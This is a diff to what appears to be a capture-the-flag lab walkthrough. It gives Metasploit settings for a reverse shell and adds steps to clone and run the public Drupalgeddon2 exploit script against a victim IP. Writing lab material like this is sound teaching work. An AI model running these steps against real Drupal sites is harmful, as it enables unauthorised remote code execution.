@@ -59,7 +59,7 @@ Set the host and port for the attacker's and victim's machine
 
 `set RHOSTS <host>`
 `set RPORT <port>`
-`set LHOST <remote ip of metasploit machine>`
+`set LHOST <remote IP of Metasploit machine>`
 `set LPORT 4444`
 
 Run the exploit!
@@ -68,9 +68,31 @@ Run the exploit!
 
 This may fail in some cases, if it fails once reset the LHOST and run again
 
-`set LHOST <remote ip of metasploit machine>`
+`set LHOST <remote IP of Metasploit machine>`
 `run`
 
 You should be able to get shell at this point and run commands in the container. Can you get the flag? Good luck!
 
 If you want to learn more about Metasploit, please check out this free course from Offensive Security: [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
+
+##### Exploit Script
+
+Before being ported to Metasploit for easy usage, exploits are usually released in the wild, in an ad-hoc way. Hackers can also take advantage of those to carry out their attacks. 
+
+If the Metasploit option didn't work or you'd like to try another way of exploiting the same vulnerability, here it is:
+
+In this scenario we are going to use the public exploit available here: https://github.com/dreadlocked/Drupalgeddon2
+
+First, you need to clone the repository into your attacker's machine:
+
+`git clone https://github.com/dreadlocked/Drupalgeddon2`
+
+Go to the project folder and install the library dependencies:
+
+`cd Drupalgeddon2`
+`sudo gem install highline`
+
+You should be able to excute the exploit like so:
+
+`./drupalgeddon2.rb {VICTIM_IP_OR_URL:VICTIM_PORT}`
+
